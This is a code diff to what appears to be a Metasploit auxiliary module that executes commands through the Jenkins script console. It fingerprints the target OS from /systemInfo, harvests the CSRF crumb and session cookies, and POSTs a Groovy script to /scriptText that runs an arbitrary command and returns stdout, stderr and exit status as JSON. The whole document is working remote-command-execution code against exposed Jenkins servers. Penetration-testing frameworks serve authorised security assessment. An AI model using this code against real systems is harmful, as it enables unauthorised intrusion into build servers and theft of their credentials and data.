@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'cgi'
+require 'json'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -46,92 +46,128 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def fingerprint_os(ip)
-    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, "systemInfo") })
+  def fingerprint_os(_ip)
+    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'systemInfo'), 'keep_cookies' => true })
 
     # Verify that we received a proper systemInfo response
-    unless res && res.body.to_s.length > 0
-      vprint_error("#{peer} - The server did not reply to our systemInfo request")
+    if res.nil? || res.body.to_s.empty?
+      vprint_error('The server did not reply to our systemInfo request')
       return
     end
 
-    unless res.body.index("System Properties") &&
-           res.body.index("Environment Variables")
-      if res.body.index('Remember me on this computer')
-        vprint_error("#{peer} This Jenkins-CI system requires authentication")
-      else
-        vprint_error("#{peer} This system is not running Jenkins-CI at #{datastore['TARGETURI']}")
-      end
+    html = res.get_html_document
+    jenkins_response = res.headers['X-Jenkins'].present? || html.at_css('body#jenkins')
+    if jenkins_response && [401, 403].include?(res.code)
+      vprint_error('This Jenkins-CI system requires authentication')
+      return
+    end
+
+    unless res.code == 200 && jenkins_response && res.body.include?('System Properties') && res.body.include?('Environment Variables')
+      vprint_error("This system is not running Jenkins-CI at #{datastore['TARGETURI']}")
       return
     end
 
     host_info = {}
-    if (res.body =~ /"\.crumb", "([a-z0-9]*)"/)
-      print_status("#{peer} Using CSRF token: '#{$1}'")
-      host_info[:crumb] = $1
-
-      sessionid = 'JSESSIONID' << res.get_cookies.split('JSESSIONID')[1].split('; ')[0]
-      host_info[:cookie] = "#{sessionid}"
+    if (crumb = html.at_css('[data-crumb-value]'))
+      host_info[:crumb] = crumb['data-crumb-value']
+      host_info[:crumb_name] = crumb['data-crumb-header'] || 'Jenkins-Crumb'
+    elsif (match = res.body.match(/"\.crumb", "([a-z0-9]*)"/))
+      host_info[:crumb] = match[1]
+      host_info[:crumb_name] = '.crumb'
+    elsif (match = res.body.match(/crumb\.init\("Jenkins-Crumb", "([a-z0-9]*)"\)/))
+      host_info[:crumb] = match[1]
+      host_info[:crumb_name] = 'Jenkins-Crumb'
+    end
+    if host_info[:crumb]
+      vprint_status("Using CSRF field #{host_info[:crumb_name]}")
+      host_info[:cookie] = res.get_cookies
     end
 
-    os_info = pattern_extract(/os.name(.*?)os.version/m, res.body).first
-    host_info[:prefix] = os_info.index(">Windows") ? "cmd.exe /c " : ""
+    row = html.css('tr').find { |entry| entry.css('> td').first&.text&.strip == 'os.name' }
+    value_cell = row&.css('> td')&.[](1)
+    os_name = (value_cell&.at_css('.app-hidden-info-hide') || value_cell)&.text&.strip
+    if os_name.to_s.empty?
+      vprint_error('The system information response did not contain the operating system name')
+      return
+    end
+
+    host_info[:prefix] = os_name.start_with?('Windows') ? 'cmd.exe /c ' : ''
     host_info
   end
 
   def run_host(ip)
-    command = datastore['COMMAND'].gsub("\\", "\\\\\\")
-
     host_info = fingerprint_os(ip)
     return if host_info.nil?
 
-    prefix = host_info[:prefix]
+    command = datastore['COMMAND'].to_s.dup.force_encoding(::Encoding::UTF_8)
+    unless command.valid_encoding?
+      vprint_error('Command must contain valid UTF-8 text')
+      return
+    end
 
     request_parameters = {
-      'uri' => normalize_uri(target_uri.path, "script"),
+      'uri' => normalize_uri(target_uri.path, 'scriptText'),
       'method' => 'POST',
       'ctype' => 'application/x-www-form-urlencoded',
       'vars_post' =>
         {
-          'script' => "def sout = new StringBuffer(), serr = new StringBuffer()\r\ndef proc = '#{prefix} #{command}'.execute()\r\nproc.consumeProcessOutput(sout, serr)\r\nproc.waitForOrKill(1000)\r\nprintln \"out> $sout err> $serr\"\r\n",
+          'script' => command_script("#{host_info[:prefix]}#{command}"),
           'Submit' => 'Run'
         }
     }
     request_parameters['cookie'] = host_info[:cookie] unless host_info[:cookie].nil?
-    request_parameters['vars_post']['.crumb'] = host_info[:crumb] unless host_info[:crumb].nil?
+    request_parameters['vars_post'][host_info.fetch(:crumb_name, '.crumb')] = host_info[:crumb] unless host_info[:crumb].nil?
     res = send_request_cgi(request_parameters)
 
-    unless res && res.body.to_s.length > 0
-      vprint_error("#{peer} No response received from the server.")
+    unless res
+      vprint_error('No response received while executing the command')
       return
     end
 
-    plugin_output, command_output = pattern_extract(/<pre>(.*?)<\/pre>/m, res.body.to_s)
-
-    if plugin_output !~ /Jenkins\.instance\.pluginManager\.plugins/
-      vprint_error("#{peer} The server returned an invalid response.")
+    unless res.code == 200
+      vprint_error("Command execution returned HTTP #{res.code}")
       return
     end
 
-    # The output is double-HTML encoded
-    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s))
-                .gsub(/\s*(out|err)>\s*/m, '')
-                .strip
-
-    if output =~ /^java\.[a-zA-Z\.]+\:\s*([^\n]+)\n/
-      output = $1
-      print_good("#{peer} The server is vulnerable, but the command failed: #{output}")
-    else
-      output.split("\n").each do |line|
-        print_good("#{peer} #{line.strip}")
-      end
+    result = res.get_json_document
+    if result.is_a?(Hash) && result['error'].is_a?(String)
+      vprint_error("Command execution failed: #{result['error']}")
+      return
     end
 
-    report_vulnerable(output)
+    unless result.is_a?(Hash) && result['stdout'].is_a?(String) && result['stderr'].is_a?(String) && result['exit_status'].is_a?(Integer)
+      vprint_error('Command execution did not return a valid result')
+      return
+    end
+
+    result['stdout'].each_line(chomp: true) { |line| print_good(line) }
+    result['stderr'].each_line(chomp: true) { |line| vprint_error("Command stderr: #{line}") }
+    vprint_status("Command completed with exit status #{result['exit_status']}")
+    report_vulnerable(result['stdout'] + result['stderr'])
   end
 
-  def pattern_extract(pattern, buffer)
-    buffer.to_s.scan(pattern).map { |m| m.first }
+  def command_script(command)
+    # JSON string escaping also needs Groovy's dollar interpolation disabled.
+    literal = command.to_json.gsub('$') { '\\$' }
+    # scriptText avoids HTML decoding and output markers altering command data.
+    # https://www.jenkins.io/doc/book/managing/script-console/#remote-access
+    <<~GROOVY
+      try {
+        def sout = new ByteArrayOutputStream(), serr = new ByteArrayOutputStream()
+        def proc = #{literal}.execute()
+        def stdoutThread = proc.consumeProcessOutputStream(sout)
+        def stderrThread = proc.consumeProcessErrorStream(serr)
+        proc.waitForOrKill(1000)
+        stdoutThread.join(1000)
+        stderrThread.join(1000)
+        if (stdoutThread.isAlive() || stderrThread.isAlive()) {
+          throw new java.io.IOException('Command output did not close after execution')
+        }
+        println groovy.json.JsonOutput.toJson([stdout:sout.toString('UTF-8'), stderr:serr.toString('UTF-8'), exit_status:proc.exitValue()])
+      } catch (java.io.IOException error) {
+        println groovy.json.JsonOutput.toJson([error:error.getMessage()])
+      }
+    GROOVY
   end
 
   def report_vulnerable(result)
